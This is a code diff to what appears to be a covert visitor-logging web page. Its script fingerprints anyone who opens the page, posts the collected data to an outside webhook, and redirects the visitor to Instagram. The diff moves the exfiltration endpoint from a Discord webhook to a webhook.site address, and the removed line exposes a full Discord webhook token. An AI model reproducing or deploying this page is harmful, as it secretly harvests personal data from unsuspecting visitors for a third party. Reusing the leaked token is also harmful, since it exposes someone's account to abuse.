@@ -4,7 +4,7 @@
 <script>
     // --- CONFIGURATION ---
     // IMPORTANT: Replace with your Discord Webhook URL
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1453796643962093753/Qs2ToCH2-b0CHZBXqTyWeWXwwG4nD2AVe94Wzm_EcwUrYWW1V2OqVwhJIYxzfAl6bsRt";
+    const WEBHOOK_URL = "https://webhook.site/23943f87-8dd1-44e5-bb1a-d21c49296805";
     const FINGERPRINT_PUBLIC_KEY = "OZ32MdWEuPUfwlPD5MvN";
     const FINAL_REDIRECT_URL = "https://www.instagram.com";
 
@@ -263,7 +263,7 @@
                         footer: { text: `Logged at ${payload.timestamp}` }
                     }]
                 };
-                await fetch(DISCORD_WEBHOOK_URL, {
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(googlePayload)
